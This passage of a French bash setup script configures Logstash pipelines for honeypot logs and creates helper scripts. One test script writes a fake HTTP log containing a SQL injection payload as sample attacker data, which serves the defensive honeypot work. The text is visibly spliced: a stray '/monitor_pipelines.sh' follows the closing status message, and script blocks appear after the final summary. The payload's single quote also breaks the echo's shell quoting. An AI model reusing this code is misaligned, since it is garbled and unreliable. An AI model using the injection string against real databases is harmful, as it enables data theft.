echo "   • /opt/elk-scripts/analyze_attack_patterns.sh (analyse des attaques)"
echo "   • /opt/elk-scripts/generate_test_data.sh (génération de données test)"
echo ""
print_warning "📋 PROCHAINES ÉTAPES:"
echo "1. Démarrer Logstash en mode production:"
echo "   /opt/elk-scripts/start_logstash_safe.sh"
echo ""
echo "2. Vérifier l'état des pipelines:"
echo "   /opt/elk-scripts/monitor_pipelines.sh"
echo ""
echo "3. Générer des données de test:"
echo "   /opt/elk-scripts/generate_test_data.sh"
echo ""
echo "4. Configurer Filebeat sur VM honeypot (192.168.2.117)"
echo "5. Installer et configurer Kibana (étape 5.6)"
echo ""
print_info "🔧 MONITORING EN TEMPS RÉEL:"
echo "   • Logs Logstash: journalctl -u logstash -f"
echo "   • API Logstash: curl http://192.168.2.124:9600/"
echo "   • Stats pipelines: curl http://192.168.2.124:9600/_node/stats/pipelines"
echo ""

# ================================
# CRÉATION DU FICHIER DE STATUT
# ================================

cat > /opt/elk-setup-status-pipelines.txt << EOF
=== Configuration Pipelines Logstash - Statut Final ===
Date de création: $(date)
Version: Production Ready

✅ PIPELINES CRÉÉS:
- Input Beats: /etc/logstash/conf.d/00-beats-input.conf
- Cowrie SSH: /etc/logstash/conf.d/10-cowrie-ssh.conf
- HTTP Honeypot: /etc/logstash/conf.d/20-http-honeypot.conf
- FTP Honeypot: /etc/logstash/conf.d/30-ftp-honeypot.conf
- Serveurs sécurisés: /etc/logstash/conf.d/40-secure-servers.conf
- Fail2Ban: /etc/logstash/conf.d/50-fail2ban.conf
- Debug: /etc/logstash/conf.d/99-debug.conf

✅ VALIDATION:
- Syntaxe Logstash: ✓ VALIDÉE
- Permissions: ✓ CONFIGURÉES
- Optimisations: ✓ APPLIQUÉES
- Scripts: ✓ CRÉÉS

✅ FONCTIONNALITÉS:
- GeoIP enrichissement: Activé
- Classification MITRE ATT&CK: Activé
- Détection de patterns: Activé
- Niveaux d'alerte: 4 niveaux (1-4)
- Support multi-honeypots: Activé

🔄 STATUT: PRÊT POUR PRODUCTION

📋 ACTIONS SUIVANTES:
1. Démarrer Logstash: /opt/elk-scripts/start_logstash_safe.sh
2. Configurer Filebeat sur honeypots
3. Installer Kibana pour visualisation
4. Tester l'ingestion de données

📊 MONITORING:
- Script principal: /opt/elk-scripts/monitor_pipelines.sh
- Analyse attaques: /opt/elk-scripts/analyze_attack_patterns.sh
- Test données: /opt/elk-scripts/generate_test_data.sh

Configuration créée par: configure_logstash_pipelines.sh
Prêt pour: Étape 5.6 - Configuration Kibana
EOF

echo "$(date): Pipelines Logstash créés avec succès - Production Ready" >> /var/log/elk-setup/install.log

print_status "📄 Configuration sauvegardée: /opt/elk-setup-status-pipelines.txt"
print_status "🚀 Pipelines Logstash prêts pour l'ingestion des données honeypot!"

# ================================
# INSTRUCTIONS FINALES
# ================================

echo ""
print_info "🎯 COMMANDES IMMÉDIATES:"
echo ""
echo "# Démarrer Logstash:"
echo "/opt/elk-scripts/start_logstash_safe.sh"
echo ""
echo "# Surveiller les logs:"
echo "journalctl -u logstash -f"
echo ""
echo "# Vérifier l'API:"
echo "curl http://192.168.2.124:9600/"
echo ""
echo "# Tester les pipelines:"
echo "/opt/elk-scripts/test_pipelines.sh"
echo ""

print_status "=== Étape 5.5 terminée avec succès! ==="/monitor_pipelines.sh

# Script de test des pipelines
cat > /opt/elk-scripts/test_pipelines.sh << 'EOF'
#!/bin/bash
echo "=== Test des Pipelines Logstash ==="

# Créer des données de test
mkdir -p /tmp/test-logs

echo "Génération de données de test..."

# Test Cowrie
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","eventid":"cowrie.login.failed","src_ip":"203.0.113.100","username":"admin","password":"123456","honeypot_type":"ssh"}' > /tmp/test-logs/cowrie.json

# Test HTTP
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","ip":"203.0.113.101","attack_type":"sql_injection","payload":"' UNION SELECT * FROM users","honeypot_type":"http"}' > /tmp/test-logs/http.json

# Test FTP
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","event_type":"auth_attempt","success":false,"src_ip":"203.0.113.102","username":"anonymous","password":"test@test.com","honeypot_type":"ftp"}' > /tmp/test-logs/ftp.json

echo "Données de test créées dans /tmp/test-logs/"
echo "Utilisez Filebeat ou importez manuellement pour tester l'ingestion"
EOF

chmod +x /opt/elk-scripts/test_pipelines.sh

# Script de démarrage sécurisé
cat > /opt/elk-scripts/start_logstash_safe.sh << 'EOF'
#!/bin/bash
echo "=== Démarrage sécurisé de Logstash ==="

# Vérifier Elasticsearch
if ! curl -s http://192.168.2.124:9200 >/dev/null; then
    echo "ERREUR: Elasticsearch non accessible"
    exit 1
fi

# Tester la configuration
echo "Test de la configuration..."
if sudo -u logstash /usr/share/logstash/bin/logstash --path.settings /etc/logstash -t; then
    echo "✓ Configuration valide"
else
    echo "✗ Configuration invalide"
    exit 1
fi

# Démarrer Logstash
echo "Démarrage de Logstash..."
systemctl start logstash

# Attendre et vérifier
sleep 10
if systemctl is-active logstash >/dev/null; then
    echo "✓ Logstash démarré avec succès"
    echo "API: http://192.168.2.124:9600"
    echo "Logs: journalctl -u logstash -f"
else
    echo "✗ Échec du démarrage"
    journalctl -u logstash --no-pager -n 10
fi
EOF

chmod +x /opt/elk-scripts